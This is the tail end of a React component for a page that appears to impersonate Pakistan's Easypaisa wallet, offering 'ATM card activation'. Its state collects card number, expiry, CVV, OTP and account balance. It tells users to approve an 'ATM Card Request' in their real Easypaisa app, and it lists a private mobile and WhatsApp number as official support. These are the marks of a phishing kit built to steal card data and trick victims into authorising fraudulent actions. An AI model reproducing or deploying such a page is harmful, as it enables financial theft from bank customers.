                  ].map((item, index) => (
                    <div key={index} className="flex gap-4">
                      <div
                        className={`flex-shrink-0 w-10 h-10 ${item.step === "✓" ? "bg-emerald-600" : "bg-blue-600"} text-white rounded-full flex items-center justify-center text-sm font-bold shadow-lg`}
                      >
                        {item.step}
                      </div>
                      <div className="flex-1">
                        <p className="font-semibold text-gray-800 mb-1">{item.title}</p>
                        <p className="text-sm text-gray-600 leading-relaxed">{item.desc}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              <div className="bg-gradient-to-r from-emerald-50 to-teal-50 p-6 rounded-2xl border border-emerald-200">
                <div className="flex items-center gap-3 mb-3">
                  <ArrowRight className="h-5 w-5 text-emerald-600" />
                  <p className="font-semibold text-emerald-800">Quick Navigation Path:</p>
                </div>
                <p className="text-sm text-emerald-700 font-mono bg-white p-3 rounded-lg border shadow-sm">
                  Easypaisa App → My Account → My Approvals (7th option) → Approve ATM Card Request
                </p>
              </div>

              <div className="bg-gradient-to-r from-amber-50 to-orange-50 p-6 rounded-2xl border border-amber-200">
                <div className="flex gap-3">
                  <Clock className="h-5 w-5 text-amber-600 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="font-semibold text-amber-800 mb-2">Important Timing Note:</p>
                    <p className="text-sm text-amber-700 leading-relaxed">
                      The approval request may take 2-3 minutes to appear in your Easypaisa app. Please check "My
                      Approvals" regularly and be patient.
                    </p>
                  </div>
                </div>
              </div>

              <Separator className="my-8" />

              <div className="flex gap-4">
                <Button
                  variant="outline"
                  onClick={() => setStep("account")}
                  className="flex-1 h-12 rounded-xl border-2 border-gray-300 hover:border-gray-400 transition-colors duration-300"
                >
                  <ArrowRight className="w-4 h-4 mr-2 rotate-180" />
                  Back to Form
                </Button>
                <Button
                  onClick={() => setStep("approval-confirmation")}
                  className="flex-1 h-12 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
                >
                  <CheckCircle className="w-4 h-4 mr-2" />
                  I've Approved It
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "approval-confirmation" && (
          <ApprovalConfirmation
            onBackToInstructions={() => setStep("approval-instructions")}
            onGoToWebsite={() => window.open("https://easypaisa.com.pk", "_blank")}
          />
        )}

        {step === "success" && (
          <Card className="shadow-2xl border-0 bg-white/90 backdrop-blur-lg overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-emerald-50/30 to-teal-50/30"></div>
            <CardHeader className="text-center relative">
              <div className="mb-6 inline-flex items-center justify-center w-24 h-24 bg-gradient-to-br from-emerald-100 to-teal-100 rounded-full mx-auto shadow-2xl">
                <CheckCircle className="h-12 w-12 text-emerald-600" />
              </div>
              <CardTitle className="text-4xl text-gray-800 mb-4">Details Submitted Successfully!</CardTitle>
              <CardDescription className="text-xl">Your ATM card activation request has been processed</CardDescription>
            </CardHeader>
            <CardContent className="space-y-8 text-center relative">
              <div className="bg-gradient-to-r from-emerald-50 to-teal-50 p-8 rounded-2xl border border-emerald-200">
                <h3 className="font-bold text-emerald-900 mb-6 text-xl">What happens next?</h3>
                <div className="space-y-4 text-left max-w-2xl mx-auto">
                  {[
                    "Please wait, you will soon receive an email confirmation",
                    "Your ATM card will be activated within 24 hours",
                    "You can start using your card for E-commerce and international transactions once activation is complete",
                  ].map((item, index) => (
                    <div key={index} className="flex items-center gap-4">
                      <div className="w-3 h-3 bg-emerald-600 rounded-full flex-shrink-0"></div>
                      <p className="text-sm text-emerald-700 leading-relaxed">{item}</p>
                    </div>
                  ))}
                </div>
              </div>

              <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-6 rounded-2xl border border-blue-200">
                <p className="text-sm text-blue-700 mb-4 leading-relaxed">
                  For more information about Easypaisa services, account management, and transaction limits, visit our
                  official website:
                </p>
                <Button
                  onClick={() => window.open("https://easypaisa.com.pk", "_blank")}
                  className="bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold px-6 py-3 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
                >
                  <ExternalLink className="w-4 h-4 mr-2" />
                  Visit Easypaisa.com.pk
                </Button>
              </div>

              <Separator className="my-8" />

              <div className="flex gap-4">
                <Button
                  variant="outline"
                  onClick={() => {
                    setStep("method")
                    setFormData({
                      accountNumber: "",
                      currentBalance: "",
                      cardNumber: "",
                      expiryDate: "",
                      cvv: "",
                      otp: "",
                    })
                    setCardDataSent(false)
                  }}
                  className="flex-1 h-12 rounded-xl border-2 border-gray-300 hover:border-gray-400 transition-colors duration-300"
                >
                  Activate Another Card
                </Button>
                <Button
                  onClick={() => window.open("https://easypaisa.com.pk", "_blank")}
                  className="flex-1 h-12 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
                >
                  <ExternalLink className="w-4 h-4 mr-2" />
                  Go to Easypaisa
                </Button>
              </div>
            </CardContent>
          </Card>
        )}
      </div>

      {/* Live Chat Widget */}
      <div className="fixed bottom-6 left-4 sm:left-6 z-50">
        <LiveChat />
      </div>

      {/* Enhanced Floating Help Button */}
      <div className="fixed bottom-6 right-4 sm:right-6 z-50">
        <Button
          onClick={() => setShowHelpModal(true)}
          className="w-16 h-16 rounded-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 shadow-2xl hover:shadow-3xl transition-all duration-300 hover:scale-110"
        >
          <HelpCircle className="h-7 w-7 text-white" />
        </Button>
      </div>

      {/* Enhanced Help Modal */}
      {showHelpModal && !showCallbackRequest && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-3 sm:p-4 overflow-y-auto">
          <Card className="w-full max-w-md bg-white/95 backdrop-blur-lg shadow-2xl my-4">
            <CardHeader>
              <div className="flex items-center justify-between">
                <CardTitle className="text-xl text-gray-800 flex items-center gap-2">
                  <HelpCircle className="h-5 w-5 text-emerald-600" />
                  Customer Support
                </CardTitle>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => setShowHelpModal(false)}
                  className="text-gray-500 hover:text-gray-700 rounded-full"
                >
                  ✕
                </Button>
              </div>
              <CardDescription>Get help with your ATM card activation</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-3">
                {[
                  {
                    icon: Phone,
                    color: "emerald",
                    title: "Call Support",
                    detail: "03447439775",
                    note: "Available 24/7",
                    action: "tel:03447439775",
                    label: "Call",
                  },
                  {
                    icon: MessageCircle,
                    color: "blue",
                    title: "WhatsApp Support",
                    detail: "+92-344-7439775",
                    note: "Quick response",
                    action: "https://wa.me/923447439775",
                    label: "Chat",
                  },
                  {
                    icon: PhoneCall,
                    color: "purple",
                    title: "Request Callback",
                    detail: "We'll call you back",
                    note: "Schedule a convenient time",
                    action: () => setShowCallbackRequest(true),
                    label: "Request",
                  },
                  {
                    icon: Mail,
                    color: "orange",
                    title: "Email Support",
                    detail: "help@easypaisa.com",
                    note: "Response within 2 hours",
                    action: "mailto:help@easypaisa.com",
                    label: "Email",
                  },
                ].map((item, index) => (
                  <div
                    key={index}
                    className="flex items-center gap-3 p-4 bg-gray-50 rounded-xl border border-gray-100 hover:shadow-lg transition-shadow duration-300"
                  >
                    <div className="flex-shrink-0 w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center">
                      <item.icon className="h-5 w-5 text-gray-600" />
                    </div>
                    <div className="flex-1">
                      <p className="font-semibold text-gray-800">{item.title}</p>
                      <p className="text-sm text-gray-600">{item.detail}</p>
                      <p className="text-xs text-gray-500">{item.note}</p>
                    </div>
                    <Button
                      size="sm"
                      onClick={() => {
                        if (typeof item.action === "function") {
                          item.action()
                        } else {
                          window.open(item.action)
                        }
                      }}
                      className="bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg"
                    >
                      {item.label}
                    </Button>
                  </div>
                ))}
              </div>

              <Separator />

              <div className="bg-amber-50 p-4 rounded-xl border border-amber-200">
                <p className="text-sm font-semibold text-amber-800 mb-2">Common Issues:</p>
                <ul className="text-xs text-amber-700 space-y-1">
                  <li>• Approval request not showing in app</li>
                  <li>• OTP not received</li>
                  <li>• Card activation taking too long</li>
                  <li>• Account balance verification issues</li>
                </ul>
              </div>

              <div className="text-center">
                <Button
                  onClick={() => setShowHelpModal(false)}
                  className="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-semibold rounded-xl"
                >
                  Close
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      {/* Callback Request Modal */}
      {showCallbackRequest && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-3 sm:p-4 overflow-y-auto">
          <CallbackRequest
            onBack={() => setShowCallbackRequest(false)}
            onClose={() => {
              setShowCallbackRequest(false)
              setShowHelpModal(false)
            }}
          />
        </div>
      )}
    </div>
  )
}
